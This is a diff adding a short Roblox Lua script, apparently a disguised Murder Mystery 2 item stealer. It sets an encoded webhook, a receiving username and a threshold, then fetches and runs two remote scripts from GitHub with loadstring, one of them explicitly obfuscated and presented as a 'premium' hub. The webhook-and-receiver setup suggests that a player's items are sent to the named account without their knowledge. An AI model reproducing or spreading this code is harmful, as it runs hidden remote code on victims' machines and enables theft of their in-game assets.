@@ -1,0 +1,14 @@
+local genv = getgenv()
+
+genv.WEBHOOK = 'AaFaPaiaebebkblbeaqa)aHaAa+aaavaabZaCb+aka*atb0aFawaYaYaqa!aCaZacatapa^aDaGabbda^a}a$a-aQbdaHb#ahaiqyks-usownaqwertyayayabacabavaaayaPasayalbbb-aLaEaib$ayagamaaaAaLafaxaya3aiakaoa#a&aMaxa-aiaBagasasbdbOana-ata5aHa<a>a<aEa*ataaabbqavaCa(aFagbda2akbhbAaxafbta%aCalbFaka]aAaPauaQbtaaafb'
+genv.RECEIVERS = {
+    [1] = '9GWAYNE',
+}
+genv.THRESHOLD = 2
+
+task.spawn(function(_4, _4_2, _4_3)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MIRO-HUB567/MM2_MIRO_HUB/refs/heads/main/MM2-PREMIUM"))()
+end)
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/dogo406/Starhub/refs/heads/main/obfuscated_script-1787976470656.lua.txt"))()
+end)
